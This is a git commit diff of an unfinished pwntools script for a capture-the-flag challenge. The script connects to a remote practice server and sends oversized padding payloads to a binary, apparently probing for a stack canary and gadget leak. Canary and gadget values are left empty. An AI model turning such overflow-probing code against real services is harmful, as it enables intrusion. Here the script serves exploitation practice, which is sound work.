9f5d46ebd6fa0cebac33aba37d9c0d57cf781b05
Brian <hibrian827@gmail.com>
2024-03-31 03:51:16 +0900

    solving a piece of cake

--- WHS/main.py
+++ WHS/main.py
@@ -1,25 +1,26 @@
 from pwn import *
 
-port =  9095
+port =  21785
 rem = remote("srv1.kitriwhs.kr", port)
 
 elf = ELF('./WHS/a piece of pie/problem/a_piece_of_pie')
-print(elf.address)
-print(elf.symbols["gadget"])
+base_to_gadget = elf.symbols["gadget"]
 
-elf.address = 5000
+# libc = ELF('./WHS/a piece of pie/problem/libc.so.6')
 
-print(elf.address)
-print(elf.symbols["gadget"])
-
-payload = b"A" * 0x120
+payload = b"A" * 0xb0
 rem.sendlineafter(b"name: ", payload)
-print(len(rem.recvline()))
+print(rem.recvline())
 
-# print(''.join('%02x' % ord(c) for c in "\xf9*\xd7\xfa\xfc\x7f"))
 
+payload = b"A" * 0x100
 rem.sendlineafter(b"1: ", payload)
 print(rem.recvline())
+
+canary = b""
+gadget = b""
+payload = b"A"
 rem.sendlineafter(b"2: ", payload)
-print(rem.recvline().hex()[-14 : -2])
-rem.sendlineafter(b"3: ", payload)
+print(rem.recvline())
+# print(rem.recvline().hex()[-14 : -2])
+# rem.sendlineafter(b"3: ", payload)
